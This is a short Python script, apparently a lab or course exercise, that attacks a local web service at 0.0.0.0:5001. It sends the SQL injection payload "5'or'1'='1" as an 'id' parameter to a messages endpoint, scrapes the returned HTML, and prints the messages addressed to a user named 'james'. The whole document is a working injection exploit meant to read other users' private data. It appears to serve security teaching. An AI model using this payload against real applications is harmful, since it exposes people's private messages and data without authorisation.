#Exercise 1

import requests
from bs4 import BeautifulSoup

rule = {'id':"5'or'1'='1"}

r = requests.get('http://0.0.0.0:5001/messages', rule)

soup = BeautifulSoup(r.text, features="lxml")

tags, m = soup.find_all('h5'), soup.find_all('blockquote')

for tag, message in zip(tags, m):
    if 'james' in tag.string:
        print(message.string)